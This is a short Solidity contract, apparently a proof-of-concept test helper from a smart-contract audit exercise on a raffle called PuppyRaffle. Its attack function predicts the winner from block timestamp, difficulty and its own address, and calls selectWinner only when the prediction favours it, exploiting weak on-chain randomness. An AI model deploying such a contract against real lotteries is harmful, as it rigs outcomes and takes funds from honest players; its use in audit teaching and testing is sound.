//SPDX-License-Identifier: MIT

pragma solidity ^0.7.6;

import {PuppyRaffle} from "../../src/PuppyRaffle.sol";
import {console2} from "forge-std/console2.sol";

contract AttackPRaffle {
    //Logic to attack

    PuppyRaffle public targetRaffle;

    constructor(address _target) {
        targetRaffle = PuppyRaffle(_target);
    }

    //Attack
    function attack(uint256 totalPlayers) external {
        //Arrange
        uint256 expectedWinnerIndex = uint256(
            keccak256(
                abi.encode(address(this), block.timestamp, block.difficulty)
            )
        ) % totalPlayers;

        console2.log("The Winner Index is: ", expectedWinnerIndex);
        require(
            targetRaffle.players(expectedWinnerIndex) == address(this),
            "Math says we won't win this block. Reverting!"
        );

        //Act
        targetRaffle.selectWinner();
    }
}
